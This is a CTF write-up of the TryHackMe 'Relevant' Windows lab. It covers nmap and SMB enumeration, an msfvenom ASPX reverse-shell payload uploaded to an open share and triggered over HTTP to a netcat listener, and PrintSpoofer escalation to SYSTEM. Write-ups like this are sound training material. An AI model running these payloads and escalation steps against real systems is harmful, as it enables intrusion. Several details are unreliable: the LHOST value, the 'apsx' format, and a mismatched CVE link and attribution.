---
title: "Relevant"
date: 2025-09-01
draft: false
summary: "Writeup for Relevant CTF challenge on TryHackMe."
tags: ["windows", "rce", "misconfigured privs"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/relevant/cover.webp"
  caption: "Relevant TryHackMe Challenge"
  alt: "Relevant cover"
platform: "TryHackMe"
---

You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in seven days.
<!--more-->
To access the machine, click on the link given below:
- https://tryhackme.com/room/relevant

## Reconnaissance

I performed an **nmap** aggressive scan on the target to identify open ports and services running on the target.

```shell
nmap -A -p- TARGET -Pn --min-rate 10000 -oN relevant.nmap
```

| **Port** | **Service** |
| -------- | ----------- |
| 80       | http        |
| 135      | rpc         |
| 139      | netbios     |
| 445      | smb         |
| 3389     | rdp         |
| 49663    | http        |
| 49667    | rpc         |
| 49669    | rpc         |

![](https://cdn.ziomsec.com/relevant/1.webp)

![](https://cdn.ziomsec.com/relevant/2.webp)

I also ran a vulnerability scan on **smb** using **nmap** and found it was vulnerable to **CVE-2017-0143**

```shell
nmap --script vuln -p 445,139 TARGET
```

![](https://cdn.ziomsec.com/relevant/3.webp)
## Initial Foothold

I accessed the two **http** servers revealed by **nmap** scan and found a default IIS landing page.

![](https://cdn.ziomsec.com/relevant/4.webp)

Since the **http** pages had nothing interesting, I enumerated **smb** and found an interesting share.

```shell
smbclient -L TARGET
```

![](https://cdn.ziomsec.com/relevant/5.webp)

I connected to the share and found a password file.

```shell
smbclient //TARGET/nt4wrksv -N
```

![](https://cdn.ziomsec.com/relevant/6.webp)

This file contained base64 encoded credentials.

![](https://cdn.ziomsec.com/relevant/7.webp)

I tried using them to get access using rdp but failed. I then looked into the vulnerability that I had found earlier while reconnaissance.
- https://nvd.nist.gov/vuln/detail/cve-2017-0413

The vulnerability lead to remote code execution. So to exploit it, I created an **aspx** payload using **msfvenom**.

```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=TARGET LPORT=8080 -f apsx -o exploit.aspx
```

![](https://cdn.ziomsec.com/relevant/8.webp)

I then uploaded the payload on the **smb** share that I had discovered earlier.

![](https://cdn.ziomsec.com/relevant/9.webp)

From my past experience, I found that sometimes smb shares are hosted on the web server. I tried accessing the share on both the servers and succeeded on the one running on port **49663**. I then started a **netcat** listener and executed the payload through **http** to get a reverse shell.

```shell
curl http://TARGET:49663/nt4wrksv/exploit.aspx
```

```shell
rlwrap nc -lvp PORT
```

![](https://cdn.ziomsec.com/relevant/10.webp)

With shell access, I was able to capture the user flag from *Bob*'s Desktop.

```shell
more c:\Users\Bob\Desktop\user.txt
```

![](https://cdn.ziomsec.com/relevant/11.webp)

## Privilege Escalation

I then downloaded **winPEAS** on the target and ran it to find misconfigurations that could used for privilege escalation.

However, I found nothing interesting. Next I looked at my privileges and found I had **SeImpersonatePrivilege** enabled.

```shell
whoami /priv
```

![](https://cdn.ziomsec.com/relevant/12.webp)

Users with this privilege enabled could potentially escalate to admin using **dirty potato** or **spoolspoof** exploits. I referred to the below article and downloaded the **printspoofer** exploit.
- https://www.hackingarticles.in/windows-privilege-escalation-seimpersonateprivilege/

PrintSpoofer: https://github.com/itm4n/PrintSpoofer

Finally, I used the exploit to get NT Authority/System access on the target

```shell
PrintSpoofer64.exe -i -c powershell.exe
```

![](https://cdn.ziomsec.com/relevant/13.webp)

I then captured the root flag from *Administrator*'s Desktop.

```shell
more C:\Users\Administrator\Desktop\root.txt
```

![](https://cdn.ziomsec.com/relevant/14.webp)

## Closure

Here's a quick summary of how I pwned **Relevant**:
- nmap scan revealed the **SMB** service to be vulnerable to **CVE-2017-0143**
- I also discovered an open SMB share where I could upload payloads.
- I created an ASPX payload and uploaded it on the SMB share. This share could also be accessed from the web application running on port 49663.
- Upon execution thought the web app, I got a reverse shell and captured the user flag.
- Further reconnaissance revealed that I had `SeImpersonatePrivs`.
- To exploit this privilege, I referred to an article found online and got access to the target as NT Authority/System.
- Finally I captured the root flag from administrator's desktop.

That's it from my side!
Happy hacking

---
